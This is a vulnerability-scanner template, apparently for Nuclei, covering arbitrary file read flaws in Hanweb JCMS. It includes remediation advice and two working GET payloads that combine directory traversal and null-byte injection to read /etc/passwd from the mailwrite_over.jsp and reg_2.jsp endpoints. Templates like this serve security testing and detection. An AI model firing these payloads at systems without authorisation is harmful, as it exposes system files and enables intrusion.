id: Lm-FileRead
info:
  name: Hanweb cms multiple arbitrary file read vulnerabilities
  author:
  - l0ne1y
  description: |-
    Hanweb JCMS multiple arbitrary file read vulnerabilities
    Hanweb JCMS is a content management system designed on a J2EE architecture. The system provides all the functions needed throughout the information lifecycle, including content collection, creation, management, delivery, publishing, and shared distribution.

    Hanweb JCMS has an arbitrary file read vulnerability. An attacker can exploit it to read the content of arbitrary files.
  severity: medium
  remediation: |-
    Official Fix:
    1. It is recommended that users obtain the latest patch or the latest version from the official site:
    https://www.hanweb.com/

    Temporary Fix:
    1. Filter ".", preventing users from traversing to parent directories in the URL.
    2. Use strict regular-expression validation of user-input parameter formats. Hard-code or uniformly encode filename parameters passed by the user, use a whitelist for file types, and reject parameters containing malicious or null characters.
    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict file access scope.
    4. Store file paths in the database and let users download files by submitting the corresponding file ID.
    5. Verify permissions before allowing a user to download a file.
requests:
- matchers:
  - type: word
    condition: and
    words:
    - root
    - bash
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
  - '{{BaseURL}}/lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
  method: GET
